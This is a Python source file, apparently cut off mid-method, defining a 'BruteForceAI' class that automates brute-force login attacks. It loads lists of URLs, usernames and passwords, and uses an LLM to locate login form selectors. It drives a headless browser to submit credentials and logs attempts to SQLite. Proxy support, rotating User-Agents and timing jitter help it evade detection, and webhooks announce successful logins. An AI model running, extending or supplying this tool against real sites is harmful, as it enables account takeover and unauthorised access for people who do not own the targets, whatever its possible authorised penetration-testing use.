# Cluster 4

class BruteForceAI:

    def __init__(self, urls_file, usernames_file, passwords_file, selector_retry=3, show_browser=False, browser_wait=0, proxy=None, database='bruteforce.db', llm_provider=None, llm_model=None, llm_api_key=None, ollama_url=None, force_reanalyze=False, debug=False, retry_attempts=3, dom_threshold=100, verbose=False, delay=0, jitter=0, success_exit=False, user_agents_file=None, force_retry=False, discord_webhook=None, slack_webhook=None, teams_webhook=None, telegram_webhook=None, telegram_chat_id=None):
        """
        Initialize BruteForceAI instance
        
        Args:
            urls_file: File path containing URLs (one per line) or list of URLs
            usernames_file: File path containing usernames (one per line) or list of usernames
            passwords_file: File path containing passwords (one per line) or list of passwords
            selector_retry: Number of retry attempts for selectors (default: 3)
            show_browser: Whether to show browser window (default: False)
            browser_wait: Wait time in seconds when browser is visible (default: 0)
            proxy: Proxy configuration (default: None)
            database: SQLite database file path (default: 'bruteforce.db')
            llm_provider: LLM provider ('ollama' or 'groq') (default: None)
            llm_model: LLM model name (default: None)
            llm_api_key: API key for Groq (not needed for Ollama) (default: None)
            ollama_url: Ollama server URL (default: None - uses http://localhost:11434)
            force_reanalyze: Force re-analysis even if selectors exist (default: False)
            debug: Enable debug output (default: False)
            retry_attempts: Number of retry attempts for network errors (default: 3)
            dom_threshold: DOM length difference threshold for success detection (default: 100)
            verbose: Show detailed timestamps for each attempt (default: False)
            delay: Delay in seconds between attempts (default: 0)
            jitter: Random jitter in seconds to add to delays (default: 0)
            success_exit: Stop attack for each URL after first successful login (default: False)
            user_agents_file: File containing User-Agent strings for random selection (default: None)
            force_retry: Force retry attempts that already exist in the database (default: False - skip existing)
            discord_webhook: Discord webhook URL for success notifications (default: None)
            slack_webhook: Slack webhook URL for success notifications (default: None)
            teams_webhook: Microsoft Teams webhook URL for success notifications (default: None)
            telegram_webhook: Telegram bot token for success notifications (default: None)
            telegram_chat_id: Telegram chat ID for notifications (default: None)
        """
        self.urls = self._load_data(urls_file)
        self.usernames = self._load_data(usernames_file)
        self.passwords = self._load_data(passwords_file)
        self.selector_retry = selector_retry
        self.show_browser = show_browser
        self.browser_wait = browser_wait
        self.proxy = proxy
        self.database = database
        self.llm_provider = llm_provider
        self.llm_model = llm_model
        self.llm_api_key = llm_api_key
        self.ollama_url = ollama_url or 'http://localhost:11434'
        self.force_reanalyze = force_reanalyze
        self.debug = debug
        self.retry_attempts = retry_attempts
        self.dom_threshold = dom_threshold
        self.verbose = verbose
        self.delay = delay
        self.jitter = jitter
        self.success_exit = success_exit
        self.force_retry = force_retry
        self.discord_webhook = discord_webhook
        self.slack_webhook = slack_webhook
        self.teams_webhook = teams_webhook
        self.telegram_webhook = telegram_webhook
        self.telegram_chat_id = telegram_chat_id
        self.user_agents = []
        if user_agents_file:
            try:
                self.user_agents = self.load_file_lines(user_agents_file)
                print(f'🌐 Loaded {len(self.user_agents)} User-Agent strings')
            except Exception as e:
                print(f'⚠️  Warning: Could not load User-Agents file: {e}')
                self.user_agents = []
        self.external_ip = self._get_external_ip()
        if self.debug:
            print(f'🌐 External IP: {self.external_ip or 'Unknown'}')
        self.check_or_create_database()
        self._print_webhook_config()

    def _load_data(self, data):
        """
        Load data from file or return list if already a list
        """
        if isinstance(data, list):
            return data
        elif isinstance(data, str):
            return self.load_file_lines(data)
        else:
            raise ValueError(f'Invalid data type: {type(data)}')

    def load_file_lines(self, file_path):
        """
        Load lines from a file, strip whitespace and filter empty lines
        """
        try:
            with open(file_path, 'r', encoding='utf-8-sig') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f'Error: File not found: {file_path}')
            exit(1)
        except Exception as e:
            print(f'Error reading file {file_path}: {e}')
            exit(1)

    def create_database(self):
        """
        Create SQLite database with required tables if it doesn't exist
        """
        conn = sqlite3.connect(self.database)
        cursor = conn.cursor()
        cursor.execute("\n            CREATE TABLE IF NOT EXISTS form_analysis (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                url TEXT UNIQUE,\n                login_username_selector TEXT,\n                login_password_selector TEXT,\n                login_submit_button_selector TEXT,\n                dom_length TEXT,\n                failed_dom_length TEXT,\n                dom_change INTEGER,\n                test_username_used TEXT,\n                success BOOLEAN,\n                attempts INTEGER,\n                playwright_or_requests TEXT DEFAULT 'playwright',\n                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP\n            )\n        ")
        cursor.execute("\n            CREATE TABLE IF NOT EXISTS brute_force_attempts (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                url TEXT,\n                username_or_email TEXT,\n                password TEXT,\n                dom_length TEXT,\n                failed_dom_length TEXT,\n                success BOOLEAN,\n                response_time_ms INTEGER,\n                playwright_or_requests TEXT DEFAULT 'playwright',\n                proxy_server TEXT,\n                external_ip TEXT,\n                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP\n            )\n        ")
        conn.commit()
        conn.close()
        print(f'Database initialized: {self.database}')

    def check_or_create_database(self):
        """
        Check if database exists, create it if it doesn't
        """
        if not os.path.exists(self.database):
            print(f'Database not found, creating: {self.database}')
            self.create_database()
        else:
            print(f'Database found: {self.database}')
            self.create_database()

    def _calculate_delay_with_jitter(self):
        """
        Calculate delay with random jitter for more human-like timing
        
        Returns:
            float: Total delay time (base delay + random jitter)
        """
        base_delay = self.delay
        if self.jitter > 0:
            jitter_amount = random.uniform(0, self.jitter)
            total_delay = base_delay + jitter_amount
            if self.debug:
                print(f'🎲 Delay: {base_delay}s + jitter: {jitter_amount:.2f}s = {total_delay:.2f}s')
            return total_delay
        else:
            return base_delay

    def run(self):
        """
        Execute the brute force operation
        """
        print(f'Starting brute force on {len(self.urls)} URL(s)')
        print(f'Usernames: {len(self.usernames)} loaded')
        print(f'Passwords: {len(self.passwords)} loaded')
        print(f'Show browser: {self.show_browser}')
        print(f'Selector retry: {self.selector_retry}')
        print(f'Proxy: {self.proxy}')
        print(f'Database: {self.database}')
        for url in self.urls:
            print(f'Processing URL: {url}')
            for username in self.usernames:
                for password in self.passwords:
                    print(f'  Trying: {username}:{password}')

    def __str__(self):
        return f'BruteForceAI(urls={len(self.urls)}, usernames={len(self.usernames)}, passwords={len(self.passwords)}, database={self.database})'

    def llm_prompt(self, prompt, system_prompt=None):
        """
        Send prompt to LLM provider (Ollama or Groq)
        
        Args:
            prompt: The user prompt to send
            system_prompt: Optional system prompt
            
        Returns:
            LLM response text or None if error
        """
        if not self.llm_provider or not self.llm_model:
            print('LLM provider or model not configured')
            return None
        if self.llm_provider.lower() == 'ollama':
            return self._ollama_request(prompt, system_prompt)
        elif self.llm_provider.lower() == 'groq':
            return self._groq_request(prompt, system_prompt)
        else:
            print(f'Unsupported LLM provider: {self.llm_provider}')
            return None

    def _ollama_request(self, prompt, system_prompt=None):
        """
        Send request to Ollama API
        """
        try:
            url = f'{self.ollama_url}/api/generate'
            messages = []
            if system_prompt:
                messages.append({'role': 'system', 'content': system_prompt})
            messages.append({'role': 'user', 'content': prompt})
            data = {'model': self.llm_model, 'prompt': prompt, 'stream': False}
            if system_prompt:
                data['system'] = system_prompt
            response = requests.post(url, json=data, timeout=60)
            response.raise_for_status()
            result = response.json()
            return result.get('response', '')
        except Exception as e:
            print(f'Ollama request error: {e}')
            return None

    def _groq_request(self, prompt, system_prompt=None):
        """
        Send request to Groq API
        """
        try:
            if not self.llm_api_key:
                print('Groq API key not provided')
                return None
            url = 'https://api.groq.com/openai/v1/chat/completions'
            headers = {'Authorization': f'Bearer {self.llm_api_key}', 'Content-Type': 'application/json'}
            messages = []
            if system_prompt:
                messages.append({'role': 'system', 'content': system_prompt})
            messages.append({'role': 'user', 'content': prompt})
            data = {'model': self.llm_model, 'messages': messages, 'temperature': 0.7, 'max_tokens': 1024}
            response = requests.post(url, headers=headers, json=data, timeout=60)
            response.raise_for_status()
            result = response.json()
            return result['choices'][0]['message']['content']
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 400:
                print(f'❌ Groq API Error: Bad Request (400)')
                print(f'   This usually means:')
                print(f'   1. Invalid API key format')
                print(f'   2. Request too large (HTML content might be too big)')
                print(f'   3. Invalid model name: {self.llm_model}')
                print(f'   💡 Try these high-performance models:')
                print(f'      --llm-model llama-3.3-70b-versatile  (Latest & best)')
                print(f'      --llm-model llama3-70b-8192          (Fast & reliable)')
                print(f'      --llm-model gemma2-9b-it             (Lightweight)')
                print(f'   Or use Ollama instead: --llm-provider ollama')
            elif e.response.status_code == 401:
                print(f'❌ Groq API Error: Unauthorized (401)')
                print(f'   Your API key is invalid or expired')
                print(f'   Get a new one from: https://console.groq.com/')
            elif e.response.status_code == 429:
                print(f'❌ Groq API Error: Rate Limited (429)')
                print(f"   You've exceeded the rate limit")
                print(f'   💡 Try these reliable models:')
                print(f'      --llm-model llama3-70b-8192          (Fast & reliable)')
                print(f'      --llm-model gemma2-9b-it             (Lightweight)')
                print(f'   Or use Ollama: --llm-provider ollama')
            else:
                print(f'❌ Groq API Error: HTTP {e.response.status_code}')
                print(f'   {e}')
            return None
        except Exception as e:
            print(f'❌ Groq request error: {e}')
            return None

    def stage1(self, url):
        """
        Analyze web page to identify login form selectors
        
        Args:
            url: URL to analyze
            
        Returns:
            dict: Analysis results with selectors or None if failed
        """
        print(f'Stage 1: Analyzing {url}')
        existing_selectors = self._get_existing_selectors(url)
        if existing_selectors and (not self.force_reanalyze):
            print(f'✅ Found existing working selectors for {url}')
            print(f'   Username selector: {existing_selectors.get('login_username_selector')}')
            print(f'   Password selector: {existing_selectors.get('login_password_selector')}')
            print(f'   Submit selector: {existing_selectors.get('login_submit_button_selector')}')
            print('   Skipping analysis - using existing selectors')
            return existing_selectors
        try:
            with sync_playwright() as p:
                browser_args = {'headless': not self.show_browser, 'slow_mo': 1000 if self.show_browser else 0}
                browser = p.chromium.launch(**browser_args)
                context_args = {}
                if self.proxy:
                    context_args['proxy'] = {'server': self.proxy}
                random_user_agent = self._get_random_user_agent()
                if random_user_agent:
                    context_args['user_agent'] = random_user_agent
                context = browser.new_context(**context_args)
                page = context.new_page()
                print(f'🌐 Navigating to: {url}')
                page.goto(url, timeout=30000)
                page.wait_for_load_state('networkidle')
                if self.show_browser and self.browser_wait > 0:
                    print(f'⏸️  Browser is visible - waiting {self.browser_wait} seconds...')
                    time.sleep(self.browser_wait)
                elif self.show_browser:
                    print('👀 Browser is visible (no wait time configured)')
                html_content = page.content()
                clean_dom_length = len(html_content)
                clean_html_content = html_content
                print(f'📄 Page loaded, clean DOM length: {clean_dom_length}')
                processed_html = self._extract_form_content(html_content)
                print('🤖 Analyzing with LLM...')
                selectors = None
                attempt = 1
                failed_selectors_info = ''
                best_selectors = {}
                while attempt <= self.selector_retry and (not selectors):
                    if attempt == 1:
                        print(f'🔍 Attempt {attempt}/{self.selector_retry}')
                        selectors = self._analyze_with_llm(processed_html)
                    else:
                        print(f'🔄 Retry {attempt}/{self.selector_retry} - providing feedback to LLM')
                        selectors = self._analyze_with_llm_retry(processed_html, failed_selectors_info, attempt)
                    if selectors:
                        print('🔍 Validating selectors on page...')
                        validated_selectors, validation_details = self._validate_selectors_with_details(page, selectors)
                        if validated_selectors:
                            print('🧪 Testing login attempt to measure failed DOM length...')
                            login_test_result = self._test_login_attempt(page, validated_selectors, clean_dom_length, clean_html_content)
                            if login_test_result:
                                failed_dom_length = login_test_result['failed_dom_length']
                                dom_change = login_test_result['dom_change']
                                test_username_used = login_test_result['test_username_used']
                            else:
                                failed_dom_length = None
                                dom_change = None
                                test_username_used = None
                            result = {'url': url, 'login_username_selector': validated_selectors.get('login_username_selector'), 'login_password_selector': validated_selectors.get('login_password_selector'), 'login_submit_button_selector': validated_selectors.get('login_submit_button_selector'), 'dom_length': str(clean_dom_length), 'failed_dom_length': str(failed_dom_length) if failed_dom_length else None, 'dom_change': dom_change, 'test_username_used': test_username_used, 'success': True, 'attempts': attempt, 'playwright_or_requests': 'playwright'}
                            self._save_form_analysis(result)
                            print(f'✅ Stage 1 completed for {url} (attempt {attempt})')
                            print(f'   Username selector: {validated_selectors.get('login_username_selector')}')
                            print(f'   Password selector: {validated_selectors.get('login_password_selector')}')
                            print(f'   Submit selector: {validated_selectors.get('login_submit_button_selector')}')
                            print(f'   Clean DOM length: {clean_dom_length}')
                            print(f'   Failed DOM length: {failed_dom_length}')
                            if dom_change is not None:
                                print(f'   DOM change: {dom_change} chars')
                            if test_username_used:
                                print(f'   Test email: {test_username_used}')
                            browser.close()
                            return result
                        else:
                            working_selectors = self._extract_working_selectors(selectors, validation_details)
                            if working_selectors:
                                print(f'💾 Found working selectors: {len(working_selectors)}/3')
                                for field, selector in working_selectors.items():
                                    best_selectors[field] = selector
                                    field_name = field.replace('login_', '').replace('_selector', '')
                                    print(f'   ✅ {field_name}: {selector}')
                            if len(best_selectors) == 3:
                                print('🎯 All 3 selectors found across attempts! Testing complete set...')
                                complete_validated, complete_details = self._validate_selectors_with_details(page, best_selectors)
                                if complete_validated:
                                    print('🧪 Testing login attempt to measure failed DOM length...')
                                    login_test_result = self._test_login_attempt(page, complete_validated, clean_dom_length, clean_html_content)
                                    if login_test_result:
                                        failed_dom_length = login_test_result['failed_dom_length']
                                        dom_change = login_test_result['dom_change']
                                        test_username_used = login_test_result['test_username_used']
                                    else:
                                        failed_dom_length = None
                                        dom_change = None
                                        test_username_used = None
                                    result = {'url': url, 'login_username_selector': complete_validated.get('login_username_selector'), 'login_password_selector': complete_validated.get('login_password_selector'), 'login_submit_button_selector': complete_validated.get('login_submit_button_selector'), 'dom_length': str(clean_dom_length), 'failed_dom_length': str(failed_dom_length) if failed_dom_length else None, 'dom_change': dom_change, 'test_username_used': test_username_used, 'success': True, 'attempts': attempt, 'playwright_or_requests': 'playwright'}
                                    self._save_form_analysis(result)
                                    print(f'✅ Stage 1 completed for {url} (accumulated across {attempt} attempts)')
                                    print(f'   Username selector: {complete_validated.get('login_username_selector')}')
                                    print(f'   Password selector: {complete_validated.get('login_password_selector')}')
                                    print(f'   Submit selector: {complete_validated.get('login_submit_button_selector')}')
                                    print(f'   Clean DOM length: {clean_dom_length}')
                                    print(f'   Failed DOM length: {failed_dom_length}')
                                    if dom_change is not None:
                                        print(f'   DOM change: {dom_change} chars')
                                    if test_username_used:
                                        print(f'   Test email: {test_username_used}')
                                    browser.close()
                                    return result
                                else:
                                    print('❌ Complete set validation failed, continuing...')
                            failed_selectors_info = self._prepare_failure_feedback(selectors, validation_details, best_selectors)
                            selectors = None
                            if attempt < self.selector_retry:
                                print(f'❌ Validation failed, preparing retry with feedback...')
                                if self.debug:
                                    print(f'🔍 DEBUG - Feedback to LLM:')
                                    print(f'---')
                                    print(failed_selectors_info)
                                    print(f'---')
                            else:
                                print(f'❌ All {self.selector_retry} attempts failed')
                    else:
                        print(f'❌ LLM analysis failed on attempt {attempt}')
                    attempt += 1
                print(f'❌ Stage 1 failed for {url} after {self.selector_retry} attempts')
                browser.close()
                if best_selectors:
                    print(f'💾 Saving best selectors found: {len(best_selectors)}/3')
                    result = {'url': url, 'login_username_selector': best_selectors.get('login_username_selector'), 'login_password_selector': best_selectors.get('login_password_selector'), 'login_submit_button_selector': best_selectors.get('login_submit_button_selector'), 'dom_length': str(clean_dom_length), 'failed_dom_length': None, 'dom_change': None, 'test_username_used': None, 'success': False, 'attempts': self.selector_retry, 'playwright_or_requests': 'playwright'}
                    self._save_form_analysis(result)
                    for field, selector in best_selectors.items():
                        field_name = field.replace('login_', '').replace('_selector', '')
                        print(f'   💾 Saved {field_name}: {selector}')
                else:
                    result = {'url': url, 'login_username_selector': None, 'login_password_selector': None, 'login_submit_button_selector': None, 'dom_length': str(clean_dom_length), 'failed_dom_length': None, 'dom_change': None, 'test_username_used': None, 'success': False, 'attempts': self.selector_retry, 'playwright_or_requests': 'playwright'}
                    self._save_form_analysis(result)
                    print('   💾 No working selectors found')
                return None
        except Exception as e:
            print(f'❌ Stage 1 error for {url}: {e}')
            result = {'url': url, 'login_username_selector': None, 'login_password_selector': None, 'login_submit_button_selector': None, 'dom_length': None, 'failed_dom_length': None, 'dom_change': None, 'test_username_used': None, 'success': False, 'attempts': 1, 'playwright_or_requests': 'playwright'}
            self._save_form_analysis(result)
            return None

    def _analyze_with_llm(self, html_content):
        """
        Analyze HTML content with LLM to identify selectors
        """
        if not self.llm_provider or not self.llm_model:
            print('LLM not configured, skipping analysis')
            return None
        processed_html = self._extract_form_content(html_content)
        prompt = f'Analyze this HTML and identify CSS selectors for login form elements:\n\n1. login_username_selector - CSS selector for username/email input field\n2. login_password_selector - CSS selector for password input field\n3. login_submit_button_selector - CSS selector for login submit button\n\nHTML:\n{processed_html}\n\nReturn ONLY valid JSON format:\n{{\n  "login_username_selector": "...",\n  "login_password_selector": "...", \n  "login_submit_button_selector": "..."\n}}'
        system_prompt = 'You are a web scraping expert. Analyze HTML and return precise CSS selectors for login forms. Return only valid JSON.'
        response = self.llm_prompt(prompt, system_prompt)
        if response:
            try:
                selectors = json.loads(response)
                return selectors
            except json.JSONDecodeError:
                try:
                    import re
                    json_match = re.search('```json\\s*(\\{.*?\\})\\s*```', response, re.DOTALL)
                    if json_match:
                        json_str = json_match.group(1)
                        selectors = json.loads(json_str)
                        print(f'✅ Extracted JSON from LLM response')
                        return selectors
                    json_match = re.search('(\\{[^{}]*"login_username_selector"[^{}]*\\})', response, re.DOTALL)
                    if json_match:
                        json_str = json_match.group(1)
                        selectors = json.loads(json_str)
                        print(f'✅ Found JSON in LLM response')
                        return selectors
                except json.JSONDecodeError:
                    pass
                print(f'❌ Failed to parse LLM response as JSON:')
                print(f'Response: {response[:500]}...')
                return None
        return None

    def _analyze_with_llm_retry(self, html_content, failed_selectors_info, attempt):
        """
        Analyze HTML content with LLM on retry, providing feedback about previous failures
        """
        if not self.llm_provider or not self.llm_model:
            print('LLM not configured, skipping analysis')
            return None
        processed_html = self._extract_form_content(html_content)
        prompt = f'RETRY ATTEMPT #{attempt}: The previous selectors failed validation. Please analyze this HTML again and provide DIFFERENT, more accurate CSS selectors.\n\nPREVIOUS FAILURE DETAILS:\n{failed_selectors_info}\n\nPlease analyze this HTML and identify CSS selectors for login form elements:\n\n1. login_username_selector - CSS selector for username/email input field\n2. login_password_selector - CSS selector for password input field\n3. login_submit_button_selector - CSS selector for login submit button\n\nHTML:\n{processed_html}\n\nCRITICAL INSTRUCTIONS: \n- If a selector is marked as "WORKING" above, use it EXACTLY as provided\n- Provide DIFFERENT selectors ONLY for the failed/missing ones\n- Look for alternative ways to target the same elements (class names, IDs, attributes)\n- Make sure the selectors are precise and unique\n- Do NOT change working selectors\n\nReturn ONLY valid JSON format:\n{{\n  "login_username_selector": "...",\n  "login_password_selector": "...", \n  "login_submit_button_selector": "..."\n}}'
        system_prompt = f'You are a web scraping expert on retry attempt #{attempt}. NEVER change selectors that are marked as WORKING. Only provide different selectors for failed ones. Return only valid JSON.'
        if self.debug:
            print(f'🔍 DEBUG - Full prompt to LLM (attempt {attempt}):')
            print(f'SYSTEM: {system_prompt}')
            print(f'USER: {prompt[:1000]}...')
        response = self.llm_prompt(prompt, system_prompt)
        if response:
            try:
                selectors = json.loads(response)
                return selectors
            except json.JSONDecodeError:
                try:
                    import re
                    json_match = re.search('```json\\s*(\\{.*?\\})\\s*```', response, re.DOTALL)
                    if json_match:
                        json_str = json_match.group(1)
                        selectors = json.loads(json_str)
                        print(f'✅ Extracted JSON from LLM retry response')
                        return selectors
                    json_match = re.search('(\\{[^{}]*"login_username_selector"[^{}]*\\})', response, re.DOTALL)
                    if json_match:
                        json_str = json_match.group(1)
                        selectors = json.loads(json_str)
                        print(f'✅ Found JSON in LLM retry response')
                        return selectors
                except json.JSONDecodeError:
                    pass
                print(f'❌ Failed to parse LLM retry response as JSON:')
                print(f'Response: {response[:500]}...')
                return None
        return None

    def _validate_selectors_with_details(self, page, selectors):
        """
        Validate selectors and return both results and detailed feedback
        """
        validated_selectors = {}
        validation_details = {}
        test_username = 'fake_test_user_12345'
        test_password = 'fake_test_password_12345'
        username_selector = selectors.get('login_username_selector')
        if username_selector:
            try:
                element = page.locator(username_selector).first
                if element.count() > 0:
                    input_type = element.get_attribute('type')
                    if input_type in ['text', 'email', None]:
                        try:
                            element.clear()
                            element.fill(test_username)
                            typed_value = element.input_value()
                            if typed_value == test_username:
                                validated_selectors['login_username_selector'] = username_selector
                                validation_details['username'] = f'✅ {input_type or 'text'} input - typing works'
                            else:
                                validation_details['username'] = f"❌ Typing failed - expected '{test_username}', got '{typed_value}'"
                        except Exception as e:
                            validation_details['username'] = f'❌ Cannot type in field: {str(e)[:50]}'
                    else:
                        validation_details['username'] = f'❌ Wrong input type: {input_type}'
                else:
                    validation_details['username'] = f'❌ Element not found with selector: {username_selector}'
            except Exception as e:
                validation_details['username'] = f'❌ Selector error: {str(e)[:50]}'
        password_selector = selectors.get('login_password_selector')
        if password_selector:
            try:
                element = page.locator(password_selector).first
                if element.count() > 0:
                    input_type = element.get_attribute('type')
                    if input_type == 'password':
                        try:
                            element.clear()
                            element.fill(test_password)
                            validation_details['password'] = '✅ Password input - typing works'
                            validated_selectors['login_password_selector'] = password_selector
                        except Exception as e:
                            validation_details['password'] = f'❌ Cannot type in password field: {str(e)[:50]}'
                    else:
                        validation_details['password'] = f'❌ Wrong input type: {input_type}'
                else:
                    validation_details['password'] = f'❌ Element not found with selector: {password_selector}'
            except Exception as e:
                validation_details['password'] = f'❌ Selector error: {str(e)[:50]}'
        submit_selector = selectors.get('login_submit_button_selector')
        if submit_selector:
            try:
                element = page.locator(submit_selector).first
                if element.count() > 0:
                    tag_name = element.evaluate('el => el.tagName.toLowerCase()')
                    input_type = element.get_attribute('type')
                    try:
                        if element.is_enabled() and element.is_visible():
                            element.hover()
                            validation_details['submit'] = f'✅ {tag_name} element - clickable and interactive'
                            validated_selectors['login_submit_button_selector'] = submit_selector
                        else:
                            validation_details['submit'] = f'❌ {tag_name} element not enabled or visible'
                    except Exception as e:
                        validation_details['submit'] = f'❌ Button not interactive: {str(e)[:50]}'
                else:
                    validation_details['submit'] = f'❌ Element not found with selector: {submit_selector}'
            except Exception as e:
                validation_details['submit'] = f'❌ Selector error: {str(e)[:50]}'
        try:
            if username_selector and username_selector in validated_selectors.values():
                page.locator(username_selector).first.clear()
            if password_selector and password_selector in validated_selectors.values():
                page.locator(password_selector).first.clear()
        except:
            pass
        for field, result in validation_details.items():
            print(f'   {field.capitalize()}: {result}')
        if len(validated_selectors) == 3:
            print('✅ All selectors validated and tested successfully')
            return (validated_selectors, validation_details)
        else:
            print(f'❌ Validation failed: {len(validated_selectors)}/3 selectors working')
            return (None, validation_details)

    def _prepare_failure_feedback(self, failed_selectors, validation_details, best_selectors):
        """
        Prepare detailed feedback about failed selectors for LLM retry
        """
        feedback = 'PREVIOUS ATTEMPT RESULTS:\n'
        working_selectors = []
        failed_selector_details = []
        for field, selector in best_selectors.items():
            field_name = field.replace('login_', '').replace('_selector', '')
            working_selectors.append(f"- {field_name.upper()}: '{selector}' - ✅ WORKING (use this exact one!)")
        for field, selector in failed_selectors.items():
            field_name = field.replace('login_', '').replace('_selector', '')
            detail = validation_details.get(field_name, 'Unknown error')
            if field in best_selectors:
                continue
            if '✅' in detail:
                working_selectors.append(f"- {field_name.upper()}: '{selector}' - {detail} (KEEP THIS ONE!)")
            else:
                failed_selector_details.append(f"- {field_name.upper()}: '{selector}' - {detail}")
        if working_selectors:
            feedback += '\nSELECTORS THAT WORKED (use these exact ones):\n'
            feedback += '\n'.join(working_selectors)
        if failed_selector_details:
            feedback += '\n\nSELECTORS THAT FAILED (provide different ones):\n'
            feedback += '\n'.join(failed_selector_details)
        missing_fields = []
        for field in ['login_username_selector', 'login_password_selector', 'login_submit_button_selector']:
            if field not in best_selectors:
                field_name = field.replace('login_', '').replace('_selector', '')
                missing_fields.append(field_name.upper())
        if missing_fields:
            feedback += f'\n\nSTILL NEEDED: {', '.join(missing_fields)}'
        feedback += '\n\nIMPORTANT: Keep the working selectors EXACTLY as they are. Only provide new selectors for the missing/failed ones.'
        return feedback

    def _save_form_analysis(self, result):
        """
        Save form analysis results to database
        """
        try:
            conn = sqlite3.connect(self.database)
            cursor = conn.cursor()
            cursor.execute('\n                INSERT OR REPLACE INTO form_analysis \n                (url, login_username_selector, login_password_selector, \n                 login_submit_button_selector, dom_length, failed_dom_length, \n                 dom_change, test_username_used, success, \n                 attempts, playwright_or_requests)\n                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\n            ', (result['url'], result['login_username_selector'], result['login_password_selector'], result['login_submit_button_selector'], result['dom_length'], result['failed_dom_length'], result['dom_change'], result['test_username_used'], result['success'], result['attempts'], result['playwright_or_requests']))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f'Error saving form analysis: {e}')

    def _test_login_attempt(self, page, selectors, clean_dom_length, clean_html_content):
        """
        Test actual login attempt to measure failed DOM length
        """
        try:
            print('   🔑 Filling login form with test credentials...')
            test_username = 'fake_test_user_12345@example.com'
            test_password = 'fake_test_password_12345'
            print(f'   👤 Using test username: {test_username}')
            username_selector = selectors.get('login_username_selector')
            if username_selector:
                page.locator(username_selector).first.clear()
                page.locator(username_selector).first.fill(test_username)
            password_selector = selectors.get('login_password_selector')
            if password_selector:
                page.locator(password_selector).first.clear()
                page.locator(password_selector).first.fill(test_password)
            print('   🖱️  Clicking submit button...')
            submit_selector = selectors.get('login_submit_button_selector')
            if submit_selector:
                try:
                    page.locator(submit_selector).first.click()
                    submit_button_works = True
                except Exception as e:
                    print(f'   ❌ Submit button failed to click: {str(e)[:50]}')
                    submit_button_works = False
            else:
                submit_button_works = False
            if not submit_button_works:
                print("   ⚠️  Submit button doesn't work - skipping DOM measurement")
                return {'failed_dom_length': None, 'dom_change': None, 'test_username_used': test_username}
            print('   ⏳ Waiting for login response...')
            try:
                page.wait_for_load_state('networkidle', timeout=5000)
                if self.debug:
                    print('   🔍 DEBUG - Page reached networkidle state')
            except:
                time.sleep(2)
                if self.debug:
                    print('   🔍 DEBUG - No networkidle, waited 2 seconds')
            if self.show_browser and self.browser_wait > 0:
                print(f'   ⏸️  Waiting {self.browser_wait} seconds for error messages to appear...')
                time.sleep(self.browser_wait)
            if self.debug:
                pre_clear_content = page.content()
                pre_clear_length = len(pre_clear_content)
                print(f'   🔍 DEBUG - DOM before clearing fields: {pre_clear_length}')
            try:
                if username_selector:
                    page.locator(username_selector).first.clear()
                if password_selector:
                    page.locator(password_selector).first.clear()
                if self.debug:
                    print('   🔍 DEBUG - Cleared form fields')
            except:
                if self.debug:
                    print('   🔍 DEBUG - Failed to clear form fields')
                pass
            failed_html_content = page.content()
            failed_dom_length = len(failed_html_content)
            print(f'   📊 Failed DOM length: {failed_dom_length} (vs clean: {clean_dom_length})')
            if self.debug:
                print(f'   🔍 DEBUG - Clean DOM sample (first 200 chars):')
                print(f'   {clean_html_content[:200]}...')
                print(f'   🔍 DEBUG - Failed DOM sample (first 200 chars):')
                print(f'   {failed_html_content[:200]}...')
                if failed_dom_length != clean_dom_length:
                    print(f'   🔍 DEBUG - DOM length difference: {failed_dom_length - clean_dom_length}')
                    min_len = min(len(clean_html_content), len(failed_html_content))
                    first_diff = -1
                    for i in range(min_len):
                        if clean_html_content[i] != failed_html_content[i]:
                            first_diff = i
                            break
                    if first_diff >= 0:
                        print(f'   🔍 DEBUG - First difference at position {first_diff}')
                        start = max(0, first_diff - 50)
                        end = min(len(clean_html_content), first_diff + 50)
                        print(f'   🔍 DEBUG - Clean around diff: ...{clean_html_content[start:end]}...')
                        end_failed = min(len(failed_html_content), first_diff + 50)
                        print(f'   🔍 DEBUG - Failed around diff: ...{failed_html_content[start:end_failed]}...')
                else:
                    print(f'   🔍 DEBUG - DOM content is identical')
            dom_change = abs(failed_dom_length - clean_dom_length)
            if dom_change == 0:
                print(f"   ⚠️  DOM didn't change - server may not respond to invalid credentials")
            elif dom_change < 10:
                print(f'   ⚠️  DOM barely changed ({dom_change} chars) - minimal server response')
            else:
                print(f'   ✅ DOM changed by {dom_change} chars - server responded to login attempt')
            return {'failed_dom_length': failed_dom_length, 'dom_change': dom_change, 'test_username_used': test_username}
        except Exception as e:
            print(f'   ❌ Error during login test: {str(e)[:100]}')
            return None

    def clean_database(self):
        """
        Clean (truncate) all database tables
        """
        try:
            conn = sqlite3.connect(self.database)
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM form_analysis')
            form_analysis_count = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM brute_force_attempts')
            brute_force_count = cursor.fetchone()[0]
            print(f'📊 Current records: form_analysis={form_analysis_count}, brute_force_attempts={brute_force_count}')
            cursor.execute('DELETE FROM form_analysis')
            cursor.execute('DELETE FROM brute_force_attempts')
            cursor.execute("DELETE FROM sqlite_sequence WHERE name='form_analysis'")
            cursor.execute("DELETE FROM sqlite_sequence WHERE name='brute_force_attempts'")
            conn.commit()
            conn.close()
            print('✅ Database cleaned successfully - all tables truncated')
        except Exception as e:
            print(f'❌ Error cleaning database: {e}')

    def _get_existing_selectors(self, url):
        """
        Check if selectors already exist in the database for a URL
        
        Args:
            url: URL to check
            
        Returns:
            dict: Existing selectors or None if none found
        """
        try:
            conn = sqlite3.connect(self.database)
            cursor = conn.cursor()
            cursor.execute('\n                SELECT login_username_selector, login_password_selector, login_submit_button_selector\n                FROM form_analysis\n                WHERE url = ? AND success = 1\n            ', (url,))
            result = cursor.fetchone()
            if result:
                conn.close()
                return {'login_username_selector': result[0], 'login_password_selector': result[1], 'login_submit_button_selector': result[2]}
